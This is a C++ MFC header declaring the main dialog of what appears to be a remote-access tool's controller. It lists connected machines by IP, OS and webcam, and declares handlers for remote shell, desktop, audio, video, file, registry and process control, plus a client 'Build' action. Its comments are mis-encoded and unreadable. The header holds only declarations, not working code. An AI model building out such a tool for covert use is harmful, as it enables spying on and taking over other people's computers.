
// RemoteControlDlg.h : ͷ�ļ�
//

#pragma once
#include "afxcmn.h"
#include "include/IOCPServer.h"


// CRemoteControlDlg �Ի���
class CRemoteControlDlg : public CDialogEx
{
// ����
public:
	CRemoteControlDlg(CWnd* pParent = NULL);	// ��׼���캯��

// �Ի�������
	enum { IDD = IDD_REMOTECONTROL_DIALOG };

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);	// DDX/DDV ֧��


// ʵ��
protected:
	HICON m_hIcon;

	CStatusBar  m_wndStatusBar;              //״̬��
	int iCount;							 //����������
	NOTIFYICONDATA nid;					//����ͼ��

	// ���ɵ���Ϣӳ�亯��
	virtual BOOL OnInitDialog();
	afx_msg void OnSysCommand(UINT nID, LPARAM lParam);
	afx_msg void OnPaint();
	afx_msg HCURSOR OnQueryDragIcon();
	DECLARE_MESSAGE_MAP()
public:
	afx_msg void OnSize(UINT nType, int cx, int cy);
	// ��������
	CListCtrl m_CList_Online;
	// ��־
	CListCtrl m_CList_Message;
	// ��ʼ���б�
	int InitList();
	// �������������Ϣ
	void AddList(CString strIP, CString strAddr, CString strPCName, CString strOS, CString strCPU, CString strVideo, CString strPing);
	void ShowMessage(bool bIsOK, CString strMsg);
	// α���������Ϣ��������ʹ��
	void test();
	afx_msg void OnNMRClickOnline(NMHDR *pNMHDR, LRESULT *pResult);
	afx_msg void OnOnlineAudio();
	afx_msg void OnOnlineCmd();
	afx_msg void OnOnlineDesktop();
	afx_msg void OnOnlineFile();
	afx_msg void OnOnlineProcess();
	afx_msg void OnOnlineRegedit();
	afx_msg void OnOnlineRemote();
	afx_msg void OnOnlineServer();
	afx_msg void OnOnlineVideo();
	afx_msg void OnOnlineWindow();
	afx_msg void OnOnlineDelete();
	afx_msg void OnMainAbout();
	afx_msg void OnMainBuild();
	afx_msg void OnMainSet();
	afx_msg void OnMainClose();

	//�Զ�����Ϣ
	afx_msg void OnIconNotify(WPARAM wParam, LPARAM lParam);
	// ����״̬��
	void CreatStatusBar();
	// �������ͼ��
	void AddNotify();
	afx_msg void OnNotifyClose();
	afx_msg void OnNotifyShow();
	afx_msg void OnClose();
protected:
	static void CALLBACK NotifyProc(LPVOID lpParam, ClientContext* pContext, UINT nCode);
	void CRemoteControlDlg::Activate(UINT nPort, UINT nMaxConnections);
};
